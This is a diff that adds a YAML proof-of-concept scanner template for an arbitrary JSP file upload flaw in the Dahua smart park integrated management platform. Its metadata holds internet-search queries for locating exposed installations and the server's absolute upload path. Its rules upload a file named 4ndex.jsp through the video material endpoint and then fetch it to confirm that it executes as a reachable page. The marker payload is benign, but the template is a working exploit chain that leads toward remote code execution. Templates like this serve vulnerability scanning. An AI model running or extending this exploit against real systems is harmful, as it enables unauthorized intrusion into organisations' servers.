@@ -1,0 +1,55 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="dahua-智慧园区综合管理平台"
+    hunter-query: app.name="Dahua 大华 智慧园区管理平台" | web.body="/WPMS/asset/lib/gridster/"    
+    quake-query: app:"dahua-WP"
+    zoomeye-query: title:"智慧园区综合管理平台"
+    threatbook-query: app=大华
+    cve: 
+    cnvd:
+    tips: /publishingImg/VIDEO/xxx.jsp   |  绝对路径  /opt/tomcat/webapps/publishingImg/VIDEO/xxx.jsp
+    
+name: poc-yaml-dahua-zonghe-video-upload
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /publishing/publishing/material/file/video
+            follow_redirects: false
+            headers:
+              Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{s2}}
+            body: "------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"4ndex.jsp\"\r\n\r\n4ra1n\r\n------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nsubmit\r\n------WebKitFormBoundary{{s2}}--"     
+        expression: response.status == 200 && response.body_string.contains("success!")
+
+        output:
+          search: |-
+            "(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+          filename: search["filename"]
+          search1: |-
+            "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+          newpath: search["newpath"]
+
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /publishingImg/VIDEO/{{filename}}
+            follow_redirects: false
+            headers:
+            body:         
+        expression: response.body_string.contains("4ra1n") && response.status == 200 
+
+expression: r0() && r1()
